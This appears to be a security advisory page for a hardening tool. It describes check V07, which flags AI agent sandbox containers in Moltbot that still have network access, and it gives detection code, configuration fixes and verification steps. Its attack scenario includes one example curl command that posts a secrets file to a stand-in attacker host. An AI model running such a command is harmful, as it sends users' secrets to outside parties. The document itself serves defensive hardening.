# V07: No Network Isolation

## Overview

| Property | Value |
|----------|-------|
| **ID** | V07 |
| **Severity** | High |
| **Category** | Tools |
| **Auto-Fix** | Yes |
| **CVSS Score** | 7.5 |

## Description

Sandbox containers have network access enabled, allowing:

- Data exfiltration to external servers
- Command and control (C2) communication
- SSRF attacks against internal services
- DNS-based data exfiltration
- Download of additional payloads

## Affected Files in Moltbot

- `src/agents/sandbox/docker.ts` - Container network configuration
- `src/config/types.sandbox.ts` - Docker network settings
- `src/agents/sandbox/config.ts` - Network mode resolution

## Attack Scenario

1. **Initial Access**: Attacker compromises sandboxed session
2. **Exfiltration**: Uses network to send data:
   ```bash
   curl -X POST -d "$(cat /workspace/secrets.txt)" http://attacker.com/collect
   ```
3. **C2 Setup**: Downloads and executes payloads
4. **Lateral Movement**: Probes internal network services

### Attack Vector

```
Sandbox -> Network -> Internet/Internal Services
```

## Detection

```go
func (c *NetworkIsolationCheck) Run(ctx *CheckContext) ([]Finding, error) {
    network := ctx.Config.Agents.Defaults.Sandbox.Docker.Network
    if network == "" {
        network = "bridge"  // Docker default
    }

    if network != "none" {
        return []Finding{{
            CheckID:  "V07",
            Severity: SeverityHigh,
            Title:    "Sandbox has network access",
            Detail:   fmt.Sprintf("network=%s (should be 'none')", network),
        }}, nil
    }

    return nil, nil
}
```

## Fix Applied by Hardener

```json
{
  "agents": {
    "defaults": {
      "sandbox": {
        "docker": {
          "network": "none"
        }
      }
    }
  }
}
```

## Manual Fix Instructions

### Disable Network in Sandbox

```bash
moltbot config set agents.defaults.sandbox.docker.network none
```

### Allow Specific DNS Only

If you need some network access:

```json
{
  "agents": {
    "defaults": {
      "sandbox": {
        "docker": {
          "network": "bridge",
          "dns": ["1.1.1.1"],
          "extraHosts": ["blocked.internal:127.0.0.1"]
        }
      }
    }
  }
}
```

### Create Isolated Network

```bash
# Create network with no external access
docker network create --internal moltbot-sandbox-net

# Configure moltbot to use it
moltbot config set agents.defaults.sandbox.docker.network moltbot-sandbox-net
```

## Verification Steps

1. **Check network setting**:
   ```bash
   moltbot config get agents.defaults.sandbox.docker.network
   # Should return: none
   ```

2. **Verify container network**:
   ```bash
   docker inspect moltbot-sandbox-* | jq '.[].NetworkSettings.Networks'
   ```

3. **Test from container**:
   ```bash
   # Should fail with network=none
   docker exec moltbot-sandbox-test ping -c1 8.8.8.8
   ```

## Network Modes

| Mode | Access | Use Case |
|------|--------|----------|
| `none` | No network | Maximum security |
| `bridge` | Full network | Development only |
| `host` | Host network | Never use |
| `<custom>` | Custom network | Controlled access |

## Related Vulnerabilities

- [V03: Sandbox Disabled](V03-sandbox-disabled.md)
- [V12: DNS Poisoning Risk](V12-dns-poisoning.md)

## References

- [Docker Network Documentation](https://docs.docker.com/network/)
- [Container Network Security](https://docs.docker.com/engine/security/)
